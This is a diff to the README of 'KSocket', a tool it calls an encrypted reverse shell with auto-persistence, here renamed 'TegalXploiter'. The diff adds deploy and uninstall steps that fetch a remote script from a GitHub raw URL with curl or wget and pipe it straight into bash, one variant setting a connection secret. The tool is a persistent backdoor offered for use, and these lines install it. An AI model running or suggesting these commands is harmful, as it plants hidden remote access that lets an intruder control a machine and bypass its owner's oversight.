@@ -1,4 +1,4 @@
-# KSocket
+# KSocket - TegalXploiter
 
 Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection
 
@@ -20,9 +20,22 @@ Encrypted reverse shell with auto-persistence. Single file deploy, secret-key ba
 ### Deploy
 
 ```bash
-./deploy
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
 ```
+```bash
+S="MySecret123" bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
+```
+```bash
+bash -c "$(wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
+```
+### Uninstall
 
+```bash
+curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
+```
+```bash
+wget -qO- https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy  | bash -s uninstall
+```
 ### Connect
 
 ```bash
